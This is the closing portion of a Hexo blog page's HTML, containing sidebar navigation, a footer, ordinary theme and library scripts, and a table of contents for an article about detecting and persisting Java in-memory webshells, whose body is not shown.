+      <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">友链</div>
+    </div>
+  
+</div>
+</div>
+      
+      
+        <div class="sidebar-btn-wrapper" style="position:static">
+          <div class="sidebar-toc-btn current"></div>
+          <div class="sidebar-common-btn"></div>
+        </div>
+      
+    </div>
+  </div>
+
+  
+</aside>
+
+          
+        </div>
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      2020-2025
+      <span class="footer-info-sep"></span>
+      aiyakami
+    </div>
+    
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        24.3k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        01:49
+      </div>
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        <div class="sidebar-top">
+          <img src="/images/taichi.png" height="50" width="50" alt="backtop" />
+          <div class="arrow-up"></div>
+        </div>
+        <div id="mask"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E4%B8%80%E4%BA%9B%E5%AD%A6%E4%B9%A0"><span class="toc-number">1.</span> <span class="toc-text">内存马的一些学习</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Java-EE%E6%9E%B6%E6%9E%84%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">1.0.1.</span> <span class="toc-text">Java EE架构内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#filter%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">1.0.1.1.</span> <span class="toc-text">filter内存马</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Listener%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">1.0.1.2.</span> <span class="toc-text">Listener内存马</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Spring%E7%B1%BB%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">1.0.2.</span> <span class="toc-text">Spring类型内存马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Java-Agent%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">1.0.3.</span> <span class="toc-text">Java Agent内存马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E6%9F%A5%E6%9D%80"><span class="toc-number">1.0.4.</span> <span class="toc-text">内存马的查杀</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E6%96%87%E4%BB%B6%E6%98%AF%E5%90%A6%E8%90%BD%E5%9C%B0"><span class="toc-number">1.0.4.1.</span> <span class="toc-text">基于文件是否落地</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8Earthas%E5%86%85%E5%AE%B9%E5%88%86%E6%9E%90"><span class="toc-number">1.0.4.2.</span> <span class="toc-text">基于arthas内容分析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E6%8C%81%E4%B9%85%E5%8C%96%E6%89%8B%E6%AE%B5"><span class="toc-number">1.0.5.</span> <span class="toc-text">内存马的持久化手段</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A2%AB%E6%9D%80%E5%A4%8D%E5%8E%9F"><span class="toc-number">1.0.5.1.</span> <span class="toc-text">被杀复原</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%87%8D%E5%90%AF%E7%94%9F%E6%95%88"><span class="toc-number">1.0.5.2.</span> <span class="toc-text">重启生效</span></a></li></ol></li></ol></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="aiyakami" class="lazyload">
+  <div class="sidebar-author-name">aiyakami</div>
+  <div class="sidebar-description">关联B站https://space.bilibili.com/374640673</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">15</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">首页</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">归档</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">关于</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">友链</div>
+    </div>
+  
+</div>
+</div>
+    
+  </div>
+  
+    <div class="sidebar-btn-wrapper">
+      <div class="sidebar-toc-btn current"></div>
+      <div class="sidebar-common-btn"></div>
+    </div>
+  
+</nav>
+
+    </div>
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+<script type="module" data-pjax>
+  import PhotoSwipeLightbox from "https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js";
+  
+  const pswp = () => {
+    if (_$$('.article-entry a.article-gallery-item').length > 0) {
+      new PhotoSwipeLightbox({
+        gallery: '.article-entry',
+        children: 'a.article-gallery-item',
+        pswpModule: () => import("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js")
+      }).init();
+    }
+    if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+      new PhotoSwipeLightbox({
+        gallery: '.article-gallery',
+        children: 'a.article-gallery-item',
+        pswpModule: () => import("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js")
+      }).init();
+    }
+    window.lightboxStatus = 'done';
+    window.removeEventListener('lightbox:ready', pswp);
+  }
+  if(window.lightboxStatus === 'ready') {
+    pswp()
+  } else {
+    window.addEventListener('lightbox:ready', pswp);
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.0.4/dist/index.umd.js"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["#ff5252","#ff7c7c","#ffafaf","#ffd0d0"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["#ff0000"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/quicklink@2.3.0/dist/quicklink.umd.js"></script>
+
+  <script data-pjax>
+    window.quicklink?.listen({
+      timeout: 3000,
+      priority: true,
+      ignores: []
+    });
+  </script>
+
+
+<div id="lazy-script">
+  <div>
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '0.3.3' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+  <!-- hexo injector body_end start -->
+<script src="/js/insert_highlight.js" data-pjax></script>
+<!-- hexo injector body_end end --></body>
+  </html>
+
